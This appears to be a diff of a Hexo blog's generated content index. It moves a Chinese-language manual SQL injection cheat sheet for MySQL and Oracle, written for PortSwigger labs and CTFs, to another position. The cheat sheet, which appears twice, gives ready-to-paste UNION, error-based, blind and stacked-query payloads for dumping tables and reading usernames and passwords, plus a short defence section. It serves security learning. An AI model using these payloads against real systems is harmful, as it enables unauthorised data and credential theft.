@@ -33,7 +33,7 @@
 </tr>
 <tr>
 <td>仓库</td>
-<td><a href="mailto:&#103;&#x69;&#x74;&#64;&#x67;&#x69;&#116;&#104;&#117;&#x62;&#x2e;&#99;&#x6f;&#x6d;">&#103;&#x69;&#x74;&#64;&#x67;&#x69;&#116;&#104;&#117;&#x62;&#x2e;&#99;&#x6f;&#x6d;</a>:qincaidunxueli&#x2F;my-blog.git（<code>main</code>）</td>
+<td><a href="mailto:&#x67;&#105;&#x74;&#64;&#103;&#105;&#116;&#104;&#117;&#x62;&#x2e;&#99;&#x6f;&#x6d;">&#x67;&#105;&#x74;&#64;&#103;&#105;&#116;&#104;&#117;&#x62;&#x2e;&#99;&#x6f;&#x6d;</a>:qincaidunxueli&#x2F;my-blog.git（<code>main</code>）</td>
 </tr>
 <tr>
 <td>部署</td>
@@ -621,183 +621,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Oracle sql</title>
-    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/Oracle%20sql/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="MySQL-Oracle-手工-SQL-注入-整合完整版手册"><a href="#MySQL-Oracle-手工-SQL-注入-整合完整版手册" class="headerlink" title="MySQL &amp; Oracle 手工 SQL 注入 整合完整版手册"></a>MySQL &amp; Oracle 手工 SQL 注入 整合完整版手册</h1><blockquote>
-<p>适用：PortSwigger 靶场、CTF 手工注入</p>
-<p>Payload 全部为<strong>原始文本，直接粘贴进 Burp Repeater 参数 value 框，不用手动 URL 编码</strong></p>
-<p>核心原理两者完全一致：<strong>用户可控输入直接拼接进 SQL 字符串，未使用预编译，导致注入</strong></p>
-<p>预编译局限：只能防护 WHERE 条件里的值；<strong>ORDER BY&#x2F;GROUP BY 这类 SQL 结构拼接，预编译无效，只能白名单</strong></p>
-</blockquote>
-<hr>
-<h2 id="一、系统元数据映射（最重要！）"><a href="#一、系统元数据映射（最重要！）" class="headerlink" title="一、系统元数据映射（最重要！）"></a>一、系统元数据映射（最重要！）</h2><table>
-<thead>
-<tr>
-<th>功能</th>
-<th>MySQL</th>
-<th>Oracle</th>
-<th>备注</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>查询所有表</td>
-<td><code>information_schema.tables</code></td>
-<td><code>all_tables</code> &#x2F; <code>user_tables</code></td>
-<td><code>user_tables</code>只看当前用户自己的表，注入优先用；<code>all_tables</code>能看当前用户有权限访问的所有表；<code>dba_tables</code>需要 DBA 权限</td>
-</tr>
-<tr>
-<td>查询所有列</td>
-<td><code>information_schema.columns</code></td>
-<td><code>all_tab_columns</code> &#x2F; <code>user_tab_columns</code></td>
-<td>视图里的字段名都叫<code>table_name</code>、<code>column_name</code>，只是存放位置不同</td>
-</tr>
-<tr>
-<td>筛选当前库 &#x2F;schema</td>
-<td><code>table_schema=database()</code></td>
-<td><code>owner=USER</code></td>
-<td>MySQL 叫数据库；Oracle 叫 Schema (用户)</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>记忆口诀：</p>
-<p>MySQL：查表、列都在<code>information_schema</code>里面</p>
-<p>Oracle：没有<code>information_schema</code>，用<code>user_tables</code>&#x2F;<code>user_tab_columns</code>（优先）</p>
-</blockquote>
-<hr>
-<h2 id="二、基础语法-注入常用函数对比"><a href="#二、基础语法-注入常用函数对比" class="headerlink" title="二、基础语法 &amp; 注入常用函数对比"></a>二、基础语法 &amp; 注入常用函数对比</h2><p>![[Pasted image 20261015210139.png|700]]</p>
-<h3 id="关键名词解释"><a href="#关键名词解释" class="headerlink" title="关键名词解释"></a>关键名词解释</h3><ol>
-<li><strong>dual</strong>：Oracle 虚拟伪表，只有一行空数据。Oracle 语法强制 SELECT 必须带 FROM，查常量、函数结果没有真实表时，用<code>FROM dual</code>占位。</li>
-<li><strong>ROWNUM</strong>：Oracle 伪列，不是表真实字段。查询输出结果之后，按顺序给每行分配编号，从 1 开始。只能直接用<code>ROWNUM=1</code>获取第一条。</li>
-<li><strong>LISTAGG</strong>：Oracle 聚合函数，把多条查询结果合并为一行字符串，自定义分隔符。靶场表少的时候，一次性爆出全部表 &#x2F; 列。超过 4000 字符失效，改用<code>ROWNUM+NOT IN</code>逐行获取。</li>
-</ol>
-<hr>
-<h2 id="三、注入通用流程（MySQL、Oracle-一样）"><a href="#三、注入通用流程（MySQL、Oracle-一样）" class="headerlink" title="三、注入通用流程（MySQL、Oracle 一样）"></a>三、注入通用流程（MySQL、Oracle 一样）</h2><ol>
-<li>找注入点：输入单引号<code>&#39;</code>，观察页面是否报错</li>
-<li><code>ORDER BY</code> 猜查询返回的列数量</li>
-<li>UNION SELECT，匹配<strong>列数量</strong>和<strong>列数据类型</strong></li>
-<li>查询版本 → 查询表名 → 查询列名 → 查询表内数据</li>
-</ol>
-<blockquote>
-<p>下面 Payload 统一场景：原始查询返回 2 列，注入点 category，原始 SQL：<code>SELECT name,description FROM products WHERE category=&#39;$cat&#39; AND released=1</code></p>
-</blockquote>
-<h3 id="UNION-联合注入（有回显，优先使用）"><a href="#UNION-联合注入（有回显，优先使用）" class="headerlink" title="UNION 联合注入（有回显，优先使用）"></a>UNION 联合注入（有回显，优先使用）</h3><h4 id="MySQL-Payload"><a href="#MySQL-Payload" class="headerlink" title="MySQL Payload"></a>MySQL Payload</h4><p>plaintext</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT VERSION(),DATABASE() -- </span><br></pre></td></tr></table></figure>
-
-<p>一次性爆全部表</p>
-<p>plaintext</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT GROUP_CONCAT(table_name,&#x27;:&#x27;),null FROM information_schema.tables WHERE table_schema=DATABASE() -- </span><br></pre></td></tr></table></figure>
-
-<p>一次性爆目标表所有列（假设表 users）</p>
-<p>plaintext</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT GROUP_CONCAT(column_name,&#x27;:&#x27;),null FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=&#x27;users&#x27; -- </span><br></pre></td></tr></table></figure>
-
-<p>读取数据</p>
-<p>plaintext</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT username,password FROM users LIMIT 0,1 -- </span><br></pre></td></tr></table></figure>
-
-<h4 id="Oracle-Payload（PortSwigger-靶场直接复制）"><a href="#Oracle-Payload（PortSwigger-靶场直接复制）" class="headerlink" title="Oracle Payload（PortSwigger 靶场直接复制）"></a>Oracle Payload（PortSwigger 靶场直接复制）</h4><p>测试 dual，验证 UNION 是否通</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT &#x27;test123&#x27;,null FROM dual -- </span><br></pre></td></tr></table></figure>
-
-<p>查询版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT banner,null FROM v$version -- </span><br></pre></td></tr></table></figure>
-
-<p>一次性爆出当前用户全部表（listagg 推荐）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT listagg(table_name,&#x27;:&#x27;) within group (order by table_name),null FROM user_tables -- </span><br></pre></td></tr></table></figure>
-
-<p>一次性爆出目标表所有列（假设表 USERS，大写）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT listagg(column_name,&#x27;:&#x27;) within group (order by column_name),null FROM user_tab_columns WHERE table_name=&#x27;USERS&#x27; -- </span><br></pre></td></tr></table></figure>
-
-<p>读取表内数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT USERNAME,PASSWORD FROM USERS WHERE ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
-
-<h5 id="listagg-失效备选：逐行获取（ROWNUM-NOT-IN）"><a href="#listagg-失效备选：逐行获取（ROWNUM-NOT-IN）" class="headerlink" title="listagg 失效备选：逐行获取（ROWNUM + NOT IN）"></a>listagg 失效备选：逐行获取（ROWNUM + NOT IN）</h5><p>拿第一张表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT table_name,null FROM user_tables WHERE ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
-
-<p>拿到第一张表（例：PRODUCTS），填入 NOT IN，拿第二张</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT table_name,null FROM user_tables WHERE ROWNUM=1 AND table_name NOT IN (&#x27;PRODUCTS&#x27;) -- </span><br></pre></td></tr></table></figure>
-
-<p>原理：剔除已经获取到的数据，剩下结果集再取第一条，绕开<code>ROWNUM!=2</code>的限制。</p>
-<hr>
-<h2 id="四、其他注入类型-Payload"><a href="#四、其他注入类型-Payload" class="headerlink" title="四、其他注入类型 Payload"></a>四、其他注入类型 Payload</h2><h3 id="1-报错注入"><a href="#1-报错注入" class="headerlink" title="1. 报错注入"></a>1. 报错注入</h3><p>MySQL</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND updatexml(1,concat(0x7e,VERSION(),0x7e),1) -- </span><br></pre></td></tr></table></figure>
-
-<p>Oracle（环境依赖，经常失效）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND utl_inaddr.get_host_name((SELECT table_name FROM user_tables WHERE ROWNUM=1)) -- </span><br></pre></td></tr></table></figure>
-
-<h3 id="2-布尔盲注（页面只有正常-空白两种状态，无回显）"><a href="#2-布尔盲注（页面只有正常-空白两种状态，无回显）" class="headerlink" title="2. 布尔盲注（页面只有正常 &#x2F; 空白两种状态，无回显）"></a>2. 布尔盲注（页面只有正常 &#x2F; 空白两种状态，无回显）</h3><p>MySQL</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND SUBSTRING(DATABASE(),1,1)=&#x27;a&#x27; -- </span><br></pre></td></tr></table></figure>
-
-<p>Oracle</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND SUBSTR(USER,1,1)=&#x27;S&#x27; AND ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Oracle 截取函数：<code>SUBSTR(字符串,起始位置,长度)</code></p>
-</blockquote>
-<h3 id="3-时间盲注（页面无任何差异，依靠延时判断真假）"><a href="#3-时间盲注（页面无任何差异，依靠延时判断真假）" class="headerlink" title="3. 时间盲注（页面无任何差异，依靠延时判断真假）"></a>3. 时间盲注（页面无任何差异，依靠延时判断真假）</h3><p>MySQL</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND IF(SUBSTRING(DATABASE(),1,1)=&#x27;a&#x27;,SLEEP(5),1) -- </span><br></pre></td></tr></table></figure>
-
-<p>Oracle</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND (CASE WHEN SUBSTR(USER,1,1)=&#x27;S&#x27; THEN DBMS_PIPE.RECEIVE_MESSAGE(&#x27;a&#x27;,5) ELSE NULL END) AND ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
-
-<h3 id="4-堆叠注入"><a href="#4-堆叠注入" class="headerlink" title="4. 堆叠注入"></a>4. 堆叠注入</h3><p>MySQL 可用，Oracle 完全无效</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;INSERT INTO users VALUES(&#x27;test&#x27;,&#x27;123456&#x27;); -- </span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="五、防御方案（MySQL、Oracle-通用）"><a href="#五、防御方案（MySQL、Oracle-通用）" class="headerlink" title="五、防御方案（MySQL、Oracle 通用）"></a>五、防御方案（MySQL、Oracle 通用）</h2><ol>
-<li><p><strong>首选：参数化预编译 PreparedStatement</strong></p>
-<p>  防护 WHERE 子句参数值注入</p>
-<p>  <strong>无法防御 ORDER BY、GROUP BY 这类 SQL 结构拼接，结构类只能白名单</strong></p>
-</li>
-<li><p>最小权限原则：数据库账号只分配业务必需权限，不要 DBA 管理员权限</p>
-</li>
-<li><p>输入校验：白名单 &gt; 黑名单，黑名单容易绕过</p>
-</li>
-<li><p>禁用危险函数 &#x2F; 包</p>
-<ul>
-<li>MySQL：限制<code>secure_file_priv</code>，禁止<code>into outfile</code>写文件</li>
-<li>Oracle：配置 ACL，禁用<code>utl_inaddr</code>、<code>utl_http</code></li>
-</ul>
-</li>
-<li><p>转义函数仅作为辅助防护，存在宽字节注入等绕过方式，不能单独防御注入</p>
-</li>
-<li><p>WAF 属于辅助防护，存在大量绕过手段，不能单独依赖</p>
-</li>
-</ol>
-<hr>
-<h2 id="六、高频坑点汇总"><a href="#六、高频坑点汇总" class="headerlink" title="六、高频坑点汇总"></a>六、高频坑点汇总</h2><h3 id="Oracle-坑"><a href="#Oracle-坑" class="headerlink" title="Oracle 坑"></a>Oracle 坑</h3><ol>
-<li>常量查询必须写<code>FROM dual</code>，直接<code>SELECT &#39;xxx&#39;</code>语法报错</li>
-<li><code>ROWNUM=2</code>直接查询永远为空；listagg 超长报错才用<code>ROWNUM+NOT IN</code>循环爆数据</li>
-<li>UNION 列类型必须严格匹配，不确定就用 null 占位</li>
-<li>表名字典内大写，匹配时引号内必须大写</li>
-<li>注释不能用<code>#</code>，只能<code>--</code> 或者<code>/* */</code></li>
-<li>不支持堆叠注入，分号<code>;</code>不能执行第二条 SQL</li>
-<li>优先使用<code>user_tables</code>&#x2F;<code>user_tab_columns</code>，减少无关数据干扰</li>
-</ol>
-<h3 id="MySQL-坑"><a href="#MySQL-坑" class="headerlink" title="MySQL 坑"></a>MySQL 坑</h3><ol>
-<li><code>GROUP_CONCAT</code>有长度上限，过长会截断</li>
-<li><code>||</code>不是字符串拼接，要用<code>CONCAT()</code></li>
-<li><code>LIMIT m,n</code>：跳过 m 行，取 n 行</li>
-</ol>
-<hr>
-<h2 id="七、最简实操顺序（PortSwigger-Oracle-Lab）"><a href="#七、最简实操顺序（PortSwigger-Oracle-Lab）" class="headerlink" title="七、最简实操顺序（PortSwigger Oracle Lab）"></a>七、最简实操顺序（PortSwigger Oracle Lab）</h2><ol>
-<li><code>ORDER BY</code> 判断列数</li>
-<li><code>Gifts&#39; UNION SELECT &#39;test123&#39;,null FROM dual --</code> 验证 UNION 注入</li>
-<li>listagg 一次性拿全部表名</li>
-<li>listagg 拿目标表全部列名</li>
-<li>UNION SELECT 列 1, 列 2 FROM 目标表 WHERE ROWNUM&#x3D;1 – 读取账号密码</li>
-</ol>
-]]></content>
-      <categories>
-        <category>技术</category>
-        <category>基础漏洞</category>
-        <category>SQLi</category>
-      </categories>
-      <tags>
-        <tag>Orclesql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql 打靶日记23~75</title>
     <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/sql%20%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B023~75/</url>
     <content><![CDATA[<h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><p>过滤了 –，#，先过滤#再过滤–，所以不能-#-来</p>
@@ -1096,6 +919,183 @@
       </categories>
   </entry>
   <entry>
+    <title>Oracle sql</title>
+    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/Oracle%20sql/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="MySQL-Oracle-手工-SQL-注入-整合完整版手册"><a href="#MySQL-Oracle-手工-SQL-注入-整合完整版手册" class="headerlink" title="MySQL &amp; Oracle 手工 SQL 注入 整合完整版手册"></a>MySQL &amp; Oracle 手工 SQL 注入 整合完整版手册</h1><blockquote>
+<p>适用：PortSwigger 靶场、CTF 手工注入</p>
+<p>Payload 全部为<strong>原始文本，直接粘贴进 Burp Repeater 参数 value 框，不用手动 URL 编码</strong></p>
+<p>核心原理两者完全一致：<strong>用户可控输入直接拼接进 SQL 字符串，未使用预编译，导致注入</strong></p>
+<p>预编译局限：只能防护 WHERE 条件里的值；<strong>ORDER BY&#x2F;GROUP BY 这类 SQL 结构拼接，预编译无效，只能白名单</strong></p>
+</blockquote>
+<hr>
+<h2 id="一、系统元数据映射（最重要！）"><a href="#一、系统元数据映射（最重要！）" class="headerlink" title="一、系统元数据映射（最重要！）"></a>一、系统元数据映射（最重要！）</h2><table>
+<thead>
+<tr>
+<th>功能</th>
+<th>MySQL</th>
+<th>Oracle</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查询所有表</td>
+<td><code>information_schema.tables</code></td>
+<td><code>all_tables</code> &#x2F; <code>user_tables</code></td>
+<td><code>user_tables</code>只看当前用户自己的表，注入优先用；<code>all_tables</code>能看当前用户有权限访问的所有表；<code>dba_tables</code>需要 DBA 权限</td>
+</tr>
+<tr>
+<td>查询所有列</td>
+<td><code>information_schema.columns</code></td>
+<td><code>all_tab_columns</code> &#x2F; <code>user_tab_columns</code></td>
+<td>视图里的字段名都叫<code>table_name</code>、<code>column_name</code>，只是存放位置不同</td>
+</tr>
+<tr>
+<td>筛选当前库 &#x2F;schema</td>
+<td><code>table_schema=database()</code></td>
+<td><code>owner=USER</code></td>
+<td>MySQL 叫数据库；Oracle 叫 Schema (用户)</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>记忆口诀：</p>
+<p>MySQL：查表、列都在<code>information_schema</code>里面</p>
+<p>Oracle：没有<code>information_schema</code>，用<code>user_tables</code>&#x2F;<code>user_tab_columns</code>（优先）</p>
+</blockquote>
+<hr>
+<h2 id="二、基础语法-注入常用函数对比"><a href="#二、基础语法-注入常用函数对比" class="headerlink" title="二、基础语法 &amp; 注入常用函数对比"></a>二、基础语法 &amp; 注入常用函数对比</h2><p>![[Pasted image 20261015210139.png|700]]</p>
+<h3 id="关键名词解释"><a href="#关键名词解释" class="headerlink" title="关键名词解释"></a>关键名词解释</h3><ol>
+<li><strong>dual</strong>：Oracle 虚拟伪表，只有一行空数据。Oracle 语法强制 SELECT 必须带 FROM，查常量、函数结果没有真实表时，用<code>FROM dual</code>占位。</li>
+<li><strong>ROWNUM</strong>：Oracle 伪列，不是表真实字段。查询输出结果之后，按顺序给每行分配编号，从 1 开始。只能直接用<code>ROWNUM=1</code>获取第一条。</li>
+<li><strong>LISTAGG</strong>：Oracle 聚合函数，把多条查询结果合并为一行字符串，自定义分隔符。靶场表少的时候，一次性爆出全部表 &#x2F; 列。超过 4000 字符失效，改用<code>ROWNUM+NOT IN</code>逐行获取。</li>
+</ol>
+<hr>
+<h2 id="三、注入通用流程（MySQL、Oracle-一样）"><a href="#三、注入通用流程（MySQL、Oracle-一样）" class="headerlink" title="三、注入通用流程（MySQL、Oracle 一样）"></a>三、注入通用流程（MySQL、Oracle 一样）</h2><ol>
+<li>找注入点：输入单引号<code>&#39;</code>，观察页面是否报错</li>
+<li><code>ORDER BY</code> 猜查询返回的列数量</li>
+<li>UNION SELECT，匹配<strong>列数量</strong>和<strong>列数据类型</strong></li>
+<li>查询版本 → 查询表名 → 查询列名 → 查询表内数据</li>
+</ol>
+<blockquote>
+<p>下面 Payload 统一场景：原始查询返回 2 列，注入点 category，原始 SQL：<code>SELECT name,description FROM products WHERE category=&#39;$cat&#39; AND released=1</code></p>
+</blockquote>
+<h3 id="UNION-联合注入（有回显，优先使用）"><a href="#UNION-联合注入（有回显，优先使用）" class="headerlink" title="UNION 联合注入（有回显，优先使用）"></a>UNION 联合注入（有回显，优先使用）</h3><h4 id="MySQL-Payload"><a href="#MySQL-Payload" class="headerlink" title="MySQL Payload"></a>MySQL Payload</h4><p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT VERSION(),DATABASE() -- </span><br></pre></td></tr></table></figure>
+
+<p>一次性爆全部表</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT GROUP_CONCAT(table_name,&#x27;:&#x27;),null FROM information_schema.tables WHERE table_schema=DATABASE() -- </span><br></pre></td></tr></table></figure>
+
+<p>一次性爆目标表所有列（假设表 users）</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT GROUP_CONCAT(column_name,&#x27;:&#x27;),null FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=&#x27;users&#x27; -- </span><br></pre></td></tr></table></figure>
+
+<p>读取数据</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT username,password FROM users LIMIT 0,1 -- </span><br></pre></td></tr></table></figure>
+
+<h4 id="Oracle-Payload（PortSwigger-靶场直接复制）"><a href="#Oracle-Payload（PortSwigger-靶场直接复制）" class="headerlink" title="Oracle Payload（PortSwigger 靶场直接复制）"></a>Oracle Payload（PortSwigger 靶场直接复制）</h4><p>测试 dual，验证 UNION 是否通</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT &#x27;test123&#x27;,null FROM dual -- </span><br></pre></td></tr></table></figure>
+
+<p>查询版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT banner,null FROM v$version -- </span><br></pre></td></tr></table></figure>
+
+<p>一次性爆出当前用户全部表（listagg 推荐）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT listagg(table_name,&#x27;:&#x27;) within group (order by table_name),null FROM user_tables -- </span><br></pre></td></tr></table></figure>
+
+<p>一次性爆出目标表所有列（假设表 USERS，大写）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT listagg(column_name,&#x27;:&#x27;) within group (order by column_name),null FROM user_tab_columns WHERE table_name=&#x27;USERS&#x27; -- </span><br></pre></td></tr></table></figure>
+
+<p>读取表内数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT USERNAME,PASSWORD FROM USERS WHERE ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
+
+<h5 id="listagg-失效备选：逐行获取（ROWNUM-NOT-IN）"><a href="#listagg-失效备选：逐行获取（ROWNUM-NOT-IN）" class="headerlink" title="listagg 失效备选：逐行获取（ROWNUM + NOT IN）"></a>listagg 失效备选：逐行获取（ROWNUM + NOT IN）</h5><p>拿第一张表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT table_name,null FROM user_tables WHERE ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
+
+<p>拿到第一张表（例：PRODUCTS），填入 NOT IN，拿第二张</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT table_name,null FROM user_tables WHERE ROWNUM=1 AND table_name NOT IN (&#x27;PRODUCTS&#x27;) -- </span><br></pre></td></tr></table></figure>
+
+<p>原理：剔除已经获取到的数据，剩下结果集再取第一条，绕开<code>ROWNUM!=2</code>的限制。</p>
+<hr>
+<h2 id="四、其他注入类型-Payload"><a href="#四、其他注入类型-Payload" class="headerlink" title="四、其他注入类型 Payload"></a>四、其他注入类型 Payload</h2><h3 id="1-报错注入"><a href="#1-报错注入" class="headerlink" title="1. 报错注入"></a>1. 报错注入</h3><p>MySQL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND updatexml(1,concat(0x7e,VERSION(),0x7e),1) -- </span><br></pre></td></tr></table></figure>
+
+<p>Oracle（环境依赖，经常失效）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND utl_inaddr.get_host_name((SELECT table_name FROM user_tables WHERE ROWNUM=1)) -- </span><br></pre></td></tr></table></figure>
+
+<h3 id="2-布尔盲注（页面只有正常-空白两种状态，无回显）"><a href="#2-布尔盲注（页面只有正常-空白两种状态，无回显）" class="headerlink" title="2. 布尔盲注（页面只有正常 &#x2F; 空白两种状态，无回显）"></a>2. 布尔盲注（页面只有正常 &#x2F; 空白两种状态，无回显）</h3><p>MySQL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND SUBSTRING(DATABASE(),1,1)=&#x27;a&#x27; -- </span><br></pre></td></tr></table></figure>
+
+<p>Oracle</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND SUBSTR(USER,1,1)=&#x27;S&#x27; AND ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Oracle 截取函数：<code>SUBSTR(字符串,起始位置,长度)</code></p>
+</blockquote>
+<h3 id="3-时间盲注（页面无任何差异，依靠延时判断真假）"><a href="#3-时间盲注（页面无任何差异，依靠延时判断真假）" class="headerlink" title="3. 时间盲注（页面无任何差异，依靠延时判断真假）"></a>3. 时间盲注（页面无任何差异，依靠延时判断真假）</h3><p>MySQL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND IF(SUBSTRING(DATABASE(),1,1)=&#x27;a&#x27;,SLEEP(5),1) -- </span><br></pre></td></tr></table></figure>
+
+<p>Oracle</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND (CASE WHEN SUBSTR(USER,1,1)=&#x27;S&#x27; THEN DBMS_PIPE.RECEIVE_MESSAGE(&#x27;a&#x27;,5) ELSE NULL END) AND ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
+
+<h3 id="4-堆叠注入"><a href="#4-堆叠注入" class="headerlink" title="4. 堆叠注入"></a>4. 堆叠注入</h3><p>MySQL 可用，Oracle 完全无效</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;INSERT INTO users VALUES(&#x27;test&#x27;,&#x27;123456&#x27;); -- </span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、防御方案（MySQL、Oracle-通用）"><a href="#五、防御方案（MySQL、Oracle-通用）" class="headerlink" title="五、防御方案（MySQL、Oracle 通用）"></a>五、防御方案（MySQL、Oracle 通用）</h2><ol>
+<li><p><strong>首选：参数化预编译 PreparedStatement</strong></p>
+<p>  防护 WHERE 子句参数值注入</p>
+<p>  <strong>无法防御 ORDER BY、GROUP BY 这类 SQL 结构拼接，结构类只能白名单</strong></p>
+</li>
+<li><p>最小权限原则：数据库账号只分配业务必需权限，不要 DBA 管理员权限</p>
+</li>
+<li><p>输入校验：白名单 &gt; 黑名单，黑名单容易绕过</p>
+</li>
+<li><p>禁用危险函数 &#x2F; 包</p>
+<ul>
+<li>MySQL：限制<code>secure_file_priv</code>，禁止<code>into outfile</code>写文件</li>
+<li>Oracle：配置 ACL，禁用<code>utl_inaddr</code>、<code>utl_http</code></li>
+</ul>
+</li>
+<li><p>转义函数仅作为辅助防护，存在宽字节注入等绕过方式，不能单独防御注入</p>
+</li>
+<li><p>WAF 属于辅助防护，存在大量绕过手段，不能单独依赖</p>
+</li>
+</ol>
+<hr>
+<h2 id="六、高频坑点汇总"><a href="#六、高频坑点汇总" class="headerlink" title="六、高频坑点汇总"></a>六、高频坑点汇总</h2><h3 id="Oracle-坑"><a href="#Oracle-坑" class="headerlink" title="Oracle 坑"></a>Oracle 坑</h3><ol>
+<li>常量查询必须写<code>FROM dual</code>，直接<code>SELECT &#39;xxx&#39;</code>语法报错</li>
+<li><code>ROWNUM=2</code>直接查询永远为空；listagg 超长报错才用<code>ROWNUM+NOT IN</code>循环爆数据</li>
+<li>UNION 列类型必须严格匹配，不确定就用 null 占位</li>
+<li>表名字典内大写，匹配时引号内必须大写</li>
+<li>注释不能用<code>#</code>，只能<code>--</code> 或者<code>/* */</code></li>
+<li>不支持堆叠注入，分号<code>;</code>不能执行第二条 SQL</li>
+<li>优先使用<code>user_tables</code>&#x2F;<code>user_tab_columns</code>，减少无关数据干扰</li>
+</ol>
+<h3 id="MySQL-坑"><a href="#MySQL-坑" class="headerlink" title="MySQL 坑"></a>MySQL 坑</h3><ol>
+<li><code>GROUP_CONCAT</code>有长度上限，过长会截断</li>
+<li><code>||</code>不是字符串拼接，要用<code>CONCAT()</code></li>
+<li><code>LIMIT m,n</code>：跳过 m 行，取 n 行</li>
+</ol>
+<hr>
+<h2 id="七、最简实操顺序（PortSwigger-Oracle-Lab）"><a href="#七、最简实操顺序（PortSwigger-Oracle-Lab）" class="headerlink" title="七、最简实操顺序（PortSwigger Oracle Lab）"></a>七、最简实操顺序（PortSwigger Oracle Lab）</h2><ol>
+<li><code>ORDER BY</code> 判断列数</li>
+<li><code>Gifts&#39; UNION SELECT &#39;test123&#39;,null FROM dual --</code> 验证 UNION 注入</li>
+<li>listagg 一次性拿全部表名</li>
+<li>listagg 拿目标表全部列名</li>
+<li>UNION SELECT 列 1, 列 2 FROM 目标表 WHERE ROWNUM&#x3D;1 – 读取账号密码</li>
+</ol>
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>基础漏洞</category>
+        <category>SQLi</category>
+      </categories>
+      <tags>
+        <tag>Orclesql</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS 高频事件</title>
     <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/XSS%20%E9%AB%98%E9%A2%91%E4%BA%8B%E4%BB%B6/</url>
     <content><![CDATA[<span id="more"></span>
@@ -1268,6 +1268,199 @@
         <category>技术</category>
         <category>基础漏洞</category>
